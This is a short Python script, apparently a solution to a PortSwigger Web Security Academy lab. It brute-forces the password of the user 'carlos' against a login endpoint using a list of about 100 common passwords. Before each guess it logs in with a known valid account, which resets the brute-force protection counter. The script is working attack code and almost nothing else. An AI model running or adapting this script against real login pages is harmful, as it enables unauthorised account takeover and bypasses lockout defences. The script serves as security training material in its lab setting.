import requests
import os

url = 'https://0a5b002b041d09ff80f82640005200d8.web-security-academy.net/login'

passwords = ['123456','password','12345678','qwerty','123456789','12345','1234','111111','1234567','dragon','123123','baseball','abc123','football','monkey','letmein','shadow','master','666666','qwertyuiop','123321','mustang','1234567890','michael','654321','superman','1qaz2wsx','7777777','121212','000000','qazwsx','123qwe','killer','trustno1','jordan','jennifer','zxcvbnm','asdfgh','hunter','buster','soccer','harley','batman','andrew','tigger','sunshine','iloveyou','2000','charlie','robert','thomas','hockey','ranger','daniel','starwars','klaster','112233','george','computer','michelle','jessica','pepper','1111','zxcvbn','555555','11111111','131313','freedom','777777','pass','maggie','159753','aaaaaa','ginger','princess','joshua','cheese','amanda','summer','love','ashley','nicole','chelsea','biteme','matthew','access','yankees','987654321','dallas','austin','thunder','taylor','matrix','mobilemail','mom','monitor','monitoring','montana','moon','moscow']
#passwords = ['lol', 'culo']

def test_password(password):
    data1 = { 'username': 'wiener', 'password': 'peter' }
    data2 = { 'username': 'carlos', 'password': password }
    headers = { 'Content-Type': 'application/x-www-form-urlencoded' }
    r1 = requests.post(url, data=data1, headers=headers)
    r2 = requests.post(url, data=data2, headers=headers)
    global response
    response = r2.text
    return response
        



for i in range(len(passwords)):
    test_password(passwords[i])
    #print(response)
    if 'Incorrect password' in response:
        print("Accesso fallito...")
    else:
        print("Accesso riuscito con password: " + passwords[i])
        break







